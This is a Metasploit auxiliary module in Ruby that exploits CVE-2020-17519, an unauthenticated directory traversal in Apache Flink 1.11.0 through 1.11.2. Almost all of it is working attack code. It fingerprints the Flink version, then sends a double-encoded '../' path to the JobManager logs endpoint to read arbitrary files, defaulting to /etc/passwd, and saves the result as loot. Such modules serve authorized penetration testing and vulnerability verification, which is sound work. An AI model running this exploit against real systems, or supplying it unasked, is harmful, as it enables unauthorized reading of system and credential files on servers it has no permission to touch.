##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Apache Flink JobManager Traversal',
        'Description' => %q{
          This module exploits an unauthenticated directory traversal vulnerability
          in Apache Flink versions 1.11.0 <= 1.11.2. The JobManager REST API fails
          to validate user-supplied log file paths, allowing retrieval of arbitrary
          files with the privileges of the web server user.

          This module has been tested successfully on Apache Flink version 1.11.2
          on Ubuntu 18.04.4.
        },
        'Author' => [
          '0rich1 - Ant Security FG Lab', # Vulnerability discovery
          'Hoa Nguyen - Suncsr Team', # Metasploit module
          'bcoles', # Metasploit module cleanup and improvements
        ],
        'License' => MSF_LICENSE,
        'References' => [
          ['CVE', '2020-17519'],
          ['CWE', '22'],
          ['EDB', '49398'],
          ['PACKETSTORM', '160849'],
          ['URL', 'http://www.openwall.com/lists/oss-security/2021/01/05/2'],
          ['URL', 'https://www.tenable.com/cve/CVE-2020-17519']
        ],
        'DefaultOptions' => { 'RPORT' => 8081 },
        'DisclosureDate' => '2021-01-05'
      )
    )

    register_options([
      OptInt.new('DEPTH', [ true, 'Depth for path traversal', 10]),
      OptString.new('FILEPATH', [true, 'The path to the file to read', '/etc/passwd'])
    ])
  end

  def check_host(_ip)
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'config')
    })

    unless res
      return Exploit::CheckCode::Unknown('No reply.')
    end

    unless res.body.include?('flink')
      return Exploit::CheckCode::Safe('Target is not Apache Flink.')
    end

    version = res.get_json_document['flink-version']

    if version.blank?
      return Exploit::CheckCode::Detected('Could not determine Apache Flink software version.')
    end

    if Rex::Version.new(version).between?(Rex::Version.new('1.11.0'), Rex::Version.new('1.11.2'))
      return Exploit::CheckCode::Appears("Apache Flink version #{version} appears vulnerable.")
    end

    Exploit::CheckCode::Safe("Apache Flink version #{version} is not vulnerable.")
  end

  def retrieve_file(depth, filepath)
    traversal = Rex::Text.uri_encode(Rex::Text.uri_encode("#{'../' * depth}#{filepath}", 'hex-all'))
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'jobmanager', 'logs', traversal)
    })

    unless res
      print_error('No reply')
      return
    end

    if res.code == 404
      print_error('File not found')
      return
    end

    if res.code == 500
      print_error("Unexpected reply (HTTP #{res.code}): Server encountered an error attempting to read file")
      msg = res.body.scan(/Caused by: (.+?)\\n/).flatten.last
      print_error(msg) if msg
      return
    end

    if res.code != 200
      print_error("Unexpected reply (HTTP #{res.code})")
      return
    end

    res.body.to_s
  end

  def run_host(ip)
    depth = datastore['DEPTH']
    filepath = datastore['FILEPATH']

    print_status("Downloading #{filepath} ...")
    res = retrieve_file(depth, filepath)

    return if res.blank?

    print_good("Downloaded #{filepath} (#{res.length} bytes)")
    path = store_loot(
      'apache.flink.jobmanager.traversal',
      'text/plain',
      ip,
      res,
      File.basename(filepath)
    )
    print_good("File #{filepath} saved in: #{path}")
  end
end
